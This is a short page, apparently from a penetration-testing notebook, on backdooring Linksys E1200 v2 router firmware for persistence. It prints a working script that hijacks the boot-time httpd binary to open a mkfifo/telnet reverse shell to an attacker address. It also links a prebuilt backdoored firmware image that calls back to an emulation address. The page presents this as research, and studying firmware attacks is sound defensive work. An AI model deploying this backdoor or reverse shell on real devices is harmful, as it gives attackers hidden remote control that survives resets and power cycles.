# Firmare backdoor

In this section, I will discuss the methods to install a backdoor in a firmware. This means to modify the behavior of the firmware to insert custom logic to gain **persistence** on the device. The modified firmware will then be flashed back on the hardware.

For example, we can hijack a startup binary (called on device boot) to insert custom commands to initiate a reverse shell to a remote attacker server. Since it is baked into the device's firmware, it will remain persistent on the device even across factory reset or power cycles (turning ON and OFF the power).

## 1. Startup binary hijacking

This technique aims to hijack a binary called on device boot (eg. **httpd**), to insert custom commands before the call to the actual binary is made.

In the example below, runs `/bin/sh` script that invokes a telnet reverse shell using the `/usr/bin/telnet` binary found natively on the [Linksys E1200 v2](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/iot-hardware-hacking/research-projects/linksys-e1200-v2) router. The original `httpd` binary (which has been moved to `/usr/sbin/httpd.real` ) is called at the end:

> Notice that the Telnet reverse shell and final original binary call is prefixed with `&` to background the process. This ensures that the script will continue even if each step fails

{% code overflow="wrap" %}
```sh
#!/bin/sh

# TELNET REVERSE SHELL
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh 2>&1 | /usr/bin/telnet xxx.xxx.xxx.xxx 8888 > /tmp/f &

# EXECUTE ORIGINAL 'httpd' BINARY
/usr/sbin/httpd.real &
```
{% endcode %}

**Example modified firmware**

The firmware image for the [Linksys E1200 v2](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/iot-hardware-hacking/research-projects/linksys-e1200-v2)  router Initiates a reverse shell to **192.168.1.2** port _8888_ (address used by [FirmAE](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/iot-hardware-hacking/firmware-techniques/firmware-emulation#firmae)):

{% file src="../../.gitbook/assets/linksys-e1200-v2.0.02-httpd-BACKDOORED.trx" %}



## 2. Hooking

coming ...
